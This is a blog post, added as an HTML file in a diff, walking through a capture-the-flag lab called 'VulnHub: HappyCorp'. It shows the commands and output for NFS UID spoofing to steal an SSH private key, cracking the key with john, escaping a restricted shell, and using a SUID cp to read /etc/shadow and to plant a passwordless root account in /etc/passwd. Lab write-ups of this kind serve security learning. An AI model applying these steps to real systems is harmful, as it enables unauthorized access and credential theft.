@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+    <link rel="manifest" href="/images/site.webmanifest">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="My write-up for HappyCorp, a VulnHub box created by Zayotic.">
+    <title>VulnHub: HappyCorp | ben-dale.co.uk</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    <link rel="stylesheet" href="/css/theme-override.css">
+    <header>
+
+  <nav>
+    <ul>
+      
+      
+      <li class="pull-left ">
+        <a href="/">~/ben-dale.co.uk</a>
+      </li>
+      
+      
+      <li class="pull-left ">
+        <a href="/tags/">~/tags</a>
+      </li>
+      
+
+      
+      
+      <li class="pull-right">
+        <a href="/index.xml">~/rss</a>
+      </li>
+      
+
+    </ul>
+  </nav>
+</header>
+
+  </head>
+
+  <body>
+    <br/>
+
+<div class="article-meta">
+<h1><span class="title">VulnHub: HappyCorp</span></h1>
+
+<h2 class="date">2020/03/09</h2>
+<p class="terms">
+  
+  
+  
+  
+  Tags: <a href="/tags/nikto">nikto</a> <a href="/tags/nfs">nfs</a> <a href="/tags/john">john</a> <a href="/tags/ssh">ssh</a> 
+  
+  
+</p>
+</div>
+
+
+<div class="content-wrapper">
+  <main>
+    <p>Here&rsquo;s my write-up for <a href="https://www.vulnhub.com/entry/happycorp-1,296/">HappyCorp</a>, a VulnHub box created by <a href="https://twitter.com/Zayotic">Zayotic</a>.</p>
+<h3 id="write-up">Write-up</h3>
+<p>The description for this box states the following:</p>
+<pre><code>+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
+|   Name: Happycorp         |          IP: DHCP           |
+|   Date: 2019-March-05     |        Goal: Get Root!      |
+| Author: Zayotic           | Difficultly: ???            |
++- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
+|                                                         |
+| + Average beginner/intermediate VM, only a few twists   |
+|   + May find it easy/hard (depends on YOUR background)  |
+|   + ...also which way you attack the box                |
+|                                                         |
+| + It SHOULD work on VMware                              |
+|   + REBOOT the VM if you CHANGE network modes           |
+|   + Fusion users, you'll need to retry when importing   |
+|                                                         |
+|                                                         |
++- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+
+|                                                         |
+|       --[[~~Enjoy. Have fun. Happy Hacking.~~]]--       |
+|                                                         |
++---------------------------------------------------------+
+</code></pre><p>Once I had the VM setup and running I found out the IP of the box (using <code>arp-scan</code>) and ran <code>nmap</code> to see what services were running:</p>
+<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ nmap -sC -sV -oA ports 192.168.1.189
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-09 09:55 EDT
+Nmap scan report for happycorp (192.168.1.189)
+Host is up (0.00024s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:ea:90:61:be:0a:f2:8d:c3:4e:41:03:f0:07:8b:93 (RSA)
+|   256 f6:07:4a:7e:1d:d8:cf:a7:cc:fd:fb:b3:18:ce:b3:af (ECDSA)
+|_  256 64:9a:52:7b:75:b7:92:0d:4b:78:71:26:65:37:6c:bd (ED25519)
+80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/admin.php
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Happycorp                                                                                                                                                                                                                   
+111/tcp  open  rpcbind 2-4 (RPC #100000)                                                                                                                                                                                                  
+| rpcinfo:                                                                                                                                                                                                                                
+|   program version    port/proto  service                                                                                                                                                                                                
+|   100000  2,3,4        111/tcp   rpcbind                                                                                                                                                                                                
+|   100000  2,3,4        111/udp   rpcbind                                                                                                                                                                                                
+|   100000  3,4          111/tcp6  rpcbind                                                                                                                                                                                                
+|   100000  3,4          111/udp6  rpcbind                                                                                                                                                                                                
+|   100003  3,4         2049/tcp   nfs                                                                                                                                                                                                    
+|   100003  3,4         2049/tcp6  nfs                                                                                                                                                                                                    
+|   100003  3,4         2049/udp   nfs                                                                                                                                                                                                    
+|   100003  3,4         2049/udp6  nfs                                                                                                                                                                                                    
+|   100005  1,2,3      41864/udp6  mountd                                                                                                                                                                                                 
+|   100005  1,2,3      50515/tcp6  mountd                                                                                                                                                                                                 
+|   100005  1,2,3      55840/udp   mountd                                                                                                                                                                                                 
+|   100005  1,2,3      58915/tcp   mountd                                                                                                                                                                                                 
+|   100021  1,3,4      32975/udp6  nlockmgr                                                                                                                                                                                               
+|   100021  1,3,4      44287/tcp   nlockmgr                                                                                                                                                                                               
+|   100021  1,3,4      44423/tcp6  nlockmgr                                                                                                                                                                                               
+|   100021  1,3,4      58961/udp   nlockmgr                                                                                                                                                                                               
+|   100227  3           2049/tcp   nfs_acl                                                                                                                                                                                                
+|   100227  3           2049/tcp6  nfs_acl                                                                                                                                                                                                
+|   100227  3           2049/udp   nfs_acl                                                                                                                                                                                                
+|_  100227  3           2049/udp6  nfs_acl                                                                                                                                                                                                
+2049/tcp open  nfs_acl 3 (RPC #100227)                                                                                                                                                                                                    
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>The first thing I took a look at was the http server running on port 80:</p>
+<p><img src="/static/happycorp/1.png" alt=""></p>
+<p>&ldquo;We&rsquo;re in the business of helping spread happiness worldwide&rdquo;. Cute 🤗.</p>
+<p>Scrolling down the page a bit I came across some interesting information:</p>
+<p><img src="/static/happycorp/2.png" alt=""></p>
+<pre><code>Heather Eillis - heather@happycorp.local
+Carolyn Vargas - carolyn@happycorp.local
+Rodney Douglas - rodney@happycorp.local
+Jennifer Richardson - jennifer@happycorp.local
+</code></pre><p>I noted down these names and e-mail addresses. I also added <code>happycorp.local</code> to my <code>/etc/hosts</code> incase anything was using <code>happycorp.local</code> to resolve something.</p>
+<p>I also came across a contact form but this didn&rsquo;t look to be hooked up:</p>
+<p><img src="/static/happycorp/3.png" alt=""></p>
+<p>Whilst I was clicking around I had <code>nikto</code> and <code>dirb</code> running in the background. Once I had finished looking around I took a look at what <code>dirb</code> and <code>nikto</code> had found.</p>
+<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ nikto -host http://happycorp.local
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.189
++ Target Hostname:    happycorp.local
++ Target Port:        80
++ Start Time:         2020-03-09 10:00:44 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.25 (Debian)
+...
++ OSVDB-3092: /admin.php: This might be interesting...
+...
+
+kali@kali:~$ dirb http://happycorp.local -X .php,.html
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+...
++ http://happycorp.local/admin.php (CODE:200|SIZE:469)
++ http://happycorp.local/blog.html (CODE:200|SIZE:22163)
++ http://happycorp.local/cms.php (CODE:302|SIZE:337)
++ http://happycorp.local/index.html (CODE:200|SIZE:34853)                        
+</code></pre><p>Both <code>nikto</code> and <code>dirb</code> found <code>admin.php</code>, and <code>dirb</code> also found <code>cms.php</code> but I imagined (given the 302) that you needed a session to view this page.</p>
+<p><img src="/static/happycorp/4.png" alt=""></p>
+<p>I took a look at the page source and found a helpful bit of information left by Rodney:</p>
+<p><img src="/static/happycorp/6.png" alt=""></p>
+<p>I went with the presumption that the admin credentials were hardcoded in <code>admin.php</code>. I tried the usual <code>admin:admin</code>, waited a few seconds (which I thought was odd, it shouldn&rsquo;t be this slow, especially given the comment) and was greeted with an interesting error message:</p>
+<p><img src="/static/happycorp/5.png" alt=""></p>
+<p>Did this mean that I could enumerate usernames? I tried some of the names I captured before (heather, carolyn, rodney and jennifer). Attemping to log in with &ldquo;heather&rdquo; returned a different error message this time:</p>
+<p><img src="/static/happycorp/7.png" alt=""></p>
+<p>After trying several passwords I set up <code>hydra</code> to brute force this login form. I gave it a couple of minutes, leaving <code>hydra</code> to do its thing, and given that I was now at a dead-end, I moved onto NFS running on port 2049.</p>
+<p>Running <code>showmount</code> returned the NFS server&rsquo;s export list, which only contained one thing:</p>
+<pre><code>kali@kali:~$ sudo showmount -e 192.168.1.189
+Export list for 192.168.1.189:
+/home/karl *
+</code></pre><p>This exposes user <code>karl</code>. I created an empty folder and mounted the share:</p>
+<pre><code>kali@kali:~$ mkdir /tmp/NFS
+kali@kali:~$ sudo mount 192.168.1.189:/ /tmp/NFS
+kali@kali:~$ cd /tmp/NFS/home/karl
+kali@kali:/tmp/NFS/home/karl$ ls -al
+total 28
+drwxr-xr-x 3 1001 1001 4096 Mar  5  2019 .
+drwxr-xr-x 3 root root 4096 Mar  4  2019 ..
+lrwxrwxrwx 1 root root    9 Mar  5  2019 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 1001 1001  220 Mar  4  2019 .bash_logout
+-rw-r--r-- 1 1001 1001 3538 Mar  5  2019 .bashrc
+-rw------- 1 1001 1001   28 Mar  4  2019 .lesshst
+-rw-r--r-- 1 1001 1001  675 Mar  4  2019 .profile
+drwx------ 2 1001 1001 4096 Mar  5  2019 .ssh
+</code></pre><p>I tried to <code>cd</code> into <code>.ssh</code> and got a permissions error, which made sense in my head&hellip; and then a few seconds later it didn&rsquo;t make sense. Given my rudimentary knowledge of NFS I wondered how NFS enforces file permissions when you mount a share on a different machine, with a different set of users. Could this be messed with somehow? I did some research and came across <a href="https://pentestacademy.wordpress.com/2017/09/20/nfs/">this article</a> which backed up my thinking:</p>
+<blockquote>
+<p>If there are any files on the exported share that the user doesn’t have permission to read them then it might be possible to trick the NFS server to believe that the user account that tries to read the file is the owner of the file. This can be achieved by performing UID (User ID) manipulation.</p>
+</blockquote>
+<p>I created a user on my machine named &ldquo;karl&rdquo; with the UID of 1001 and switched to <code>karl</code>:</p>
+<pre><code>kali@kali:/tmp/NFS/home/karl$ su karl
+$ ls -al
+total 28
+drwxr-xr-x 3 karl karl 4096 Mar  5  2019 .
+drwxr-xr-x 3 root root 4096 Mar  4  2019 ..
+lrwxrwxrwx 1 root root    9 Mar  5  2019 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 karl karl  220 Mar  4  2019 .bash_logout
+-rw-r--r-- 1 karl karl 3538 Mar  5  2019 .bashrc
+-rw------- 1 karl karl   28 Mar  4  2019 .lesshst
+-rw-r--r-- 1 karl karl  675 Mar  4  2019 .profile
+drwx------ 2 karl karl 4096 Mar  5  2019 .ssh
+</code></pre><p>The <code>1001</code>&rsquo;s had changed to <code>karl</code>&rsquo;s. I tried to <code>cd</code> into <code>.ssh</code> again and it worked!</p>
+<pre><code>$ cd .ssh
+$ ls -al
+total 24
+drwx------ 2 karl karl 4096 Mar  5  2019 .
+drwxr-xr-x 3 karl karl 4096 Mar  5  2019 ..
+-rw-r--r-- 1 karl karl  740 Mar  4  2019 authorized_keys
+-rw------- 1 karl karl 3326 Mar  4  2019 id_rsa
+-rw-r--r-- 1 karl karl  740 Mar  4  2019 id_rsa.pub
+-rw-r--r-- 1 karl karl   18 Mar  4  2019 user.txt
+</code></pre><p>This is also how I found the first flag:</p>
+<pre><code>$ cat user.txt
+flag1{Z29vZGJveQ}
+</code></pre><p>I planned to create another ssh keypair that I controlled and to add the public key to the <code>authorized_keys</code> file in karl&rsquo;s home directory, but I only had read permissions for the entire share. The next plan was to make a copy of the private key (id_rsa) and use that to ssh in as karl.</p>
+<pre><code># As karl
+$ cp id_rsa /home/kali/Documents/vulnhub/happycorp1
+
+# Back to kali user
+kali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa
+Enter passphrase for key 'id_rsa':
+</code></pre><p>The private key was protected by a password. Cracking this with <code>john</code> thankfully didn&rsquo;t take too long. I used <code>ssh2john.py</code> to hash the private key and used the rockyou wordlist to crack the password:</p>
+<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ /usr/share/john/ssh2john.py id_rsa id_rsa.hash
+</code></pre><p><img src="/static/happycorp/8.png" alt=""></p>
+<p>I ssh&rsquo;d in as karl and had to wait a few seconds whilst some weird error messages appeared:</p>
+<p><img src="/static/happycorp/9.png" alt=""></p>
+<p>After searching around for some explanation I came to a conclusion that either rbash or bash (or something) was stuck in a loop. I couldn&rsquo;t exit but after some keyboard smashing (lots of Ctrl+C and <code>exit</code>s) I got into a working <code>rbash</code> shell. I couldn&rsquo;t <code>cd</code> around but that didn&rsquo;t stop me from looking at files using their full path. I wanted to take a look at <code>admin.php</code> to confirm my earlier presumptions about the hardcoded password (plus hydra still hadn&rsquo;t found the password):</p>
+<p><img src="/static/happycorp/10.png" alt=""></p>
+<p>The slowness that I experienced when I was trying to log into the admin page now made sense given the <code>sleep(3)</code>. The password also was hardcoded as suggested by Rodney&rsquo;s comment.</p>
+<p>I logged in to the admin page using the now retrieved credentials but I didn&rsquo;t find much, just a few passive-aggressive remarks by Rodney in a barely functional CMS:</p>
+<p><code>cms.php</code>:
+<img src="/static/happycorp/11.png" alt=""></p>
+<p><code>home.php</code>:
+<img src="/static/happycorp/12.png" alt=""></p>
+<p><code>backup.php</code>:
+<img src="/static/happycorp/13.png" alt=""></p>
+<p>This avenue didn&rsquo;t lead anywhere so I shifted my attention back to the access I had to karl&rsquo;s account. I downloaded a copy of <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum</a> to karl&rsquo;s home directory but rbash didn&rsquo;t let me run it. I backed out and ssh&rsquo;d in again, this time using <code>-t</code> to force a shell.</p>
+<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa -t /bin/sh
+</code></pre><p>This worked and I now had a basic unrestricted shell to mess around with. I ran <code>LinEnum</code> which found that <code>cp</code> had a SUID bit set:</p>
+<p><img src="/static/happycorp/14.png" alt=""></p>
+<p>I verified this by making a copy of <code>/etc/shadow</code> and viewing it:</p>
+<p><img src="/static/happycorp/15.png" alt=""></p>
+<p>I couldn&rsquo;t get access to root&rsquo;s home directory, but given the location of the user flag I assumed the root flag would be somewhere similar, with the name &ldquo;root.txt&rdquo;:</p>
+<p><img src="/static/happycorp/16.png" alt=""></p>
+<p>Although I had the flag I still didn&rsquo;t have full root-level access, so to finish the job I made a copy of <code>/etc/passwd</code> and added the following line:</p>
+<pre><code>hacker::0:0:root:/root:/bin/bash
+</code></pre><p>I had to copy the copy of <code>/etc/passwd</code> to my local machine (using <code>python -m http.server</code>) so that I could edit it. This was because <code>cp</code> has the SUID bit set and the copy of <code>/etc/passwd</code> has read-only root privilege so I couldn&rsquo;t edit it on the box. Once I made the edit I used the same method to copy the edited <code>/etc/passwd</code> file back to HappyCorp (<code>python -m http.server</code> from my machine and <code>wget</code> from the HappyCorp box) and overwrote the passwd file under <code>/etc</code>:</p>
+<pre><code>$ cp passwd /etc/passwd
+</code></pre><p><img src="/static/happycorp/17.png" alt=""></p>
+<h3 id="final-thoughts">Final thoughts</h3>
+<p>I enjoyed HappyCorp a lot. I was left scratching my head a couple of times but with the right amount of research, I managed to get to the root flag. Thanks for the challenge Zayotic!</p>
+
+    <a href="/"> >> Home</a>
+  </main>
+</div>
+    <footer>
+      
+<script>
+(function() {
+  function center_el(tagName) {
+    var tags = document.getElementsByTagName(tagName), i, tag;
+    for (i = 0; i < tags.length; i++) {
+      tag = tags[i];
+      var parent = tag.parentElement;
+      
+      if (parent.childNodes.length === 1) {
+        
+        if (parent.nodeName === 'A') {
+          parent = parent.parentElement;
+          if (parent.childNodes.length != 1) continue;
+        }
+        if (parent.nodeName === 'P') parent.style.textAlign = 'center';
+      }
+    }
+  }
+  var tagNames = ['img', 'embed', 'object'];
+  for (var i = 0; i < tagNames.length; i++) {
+    center_el(tagNames[i]);
+  }
+})();
+</script>
+
+      
+      <hr/>
+      <a href="https://github.com/ben-dale">Github</a> | <a href="https://keybase.io/mrbenjamind">Keybase</a> | <a href="https://twitter.com/mrbenjamind">Twitter</a>
+      
+    </footer>
+    
+  </body>
+</html>
+
